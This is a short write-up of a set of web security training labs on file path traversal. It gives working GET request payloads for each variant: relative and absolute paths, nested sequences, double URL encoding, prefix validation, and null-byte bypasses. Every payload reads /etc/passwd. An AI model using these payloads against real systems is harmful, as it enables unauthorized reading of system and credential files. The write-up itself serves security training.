# Lab Objective

Description: This lab contains a file path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.

Note: Use burp suite to make GET request to solve the lab. Cannot render anything on browser.

### Lab: File path traversal, simple case

Solution: Path Traversal vulnerability located in src property of image tag.

Request on Burp: `GET /image?filename=../../../../../../../../etc/passwd`

### Lab: File path traversal, traversal sequences blocked with absolute path bypass

Additional Task: The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

Solution: Use absolute path instead of relative path.

Request on Burp: `GET /image?filename=/etc/passwd`

### Lab: File path traversal, traversal sequences stripped non-recursively

Additional Task : The application strips path traversal sequences from the user-supplied filename before using it. What the application does is that it removes `..\` or `../` from the path supplied by the image tag.

Nested Traversal Sequences: `....//` or `....\/`

Solution: Use the above sequences instead such that after removing the path traversal sequences, we can still exploit the vulnerability.

Request on Burp: `GET /image?filename=....\/....//....//....//....//etc/passwd`

### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Additional Task: The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

Solution: Double URL Encode `../../../../../../../../../../etc/passwd`

Link to URL Encoder: [https://www.urlencoder.org/](https://www.urlencoder.org/)

Request on Burp: `GET /image?filename=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd`

### Lab: File path traversal, validation of start of path

Additional Task: The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

Solution: Given that we know that base directory of web application is `image?filename=/var/www/images/*.jpg`, supply that in our exploit to pass the validation

Request on Burp: `GET /image?filename=/var/www/images/../../../../../etc/passwd`

### Lab: File path traversal, validation of file extension with null byte bypass

Additional Task: The application validates that the supplied filename ends with the expected file extension.

Solution: Add null byte in between `/etc/passwd` and `jpeg` to pass the validation

Solution 2: Use [wordlist](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt) along with Burp Intruder

Request on Burp: `GET /image?filename=../../../../etc/passwd%00.png`


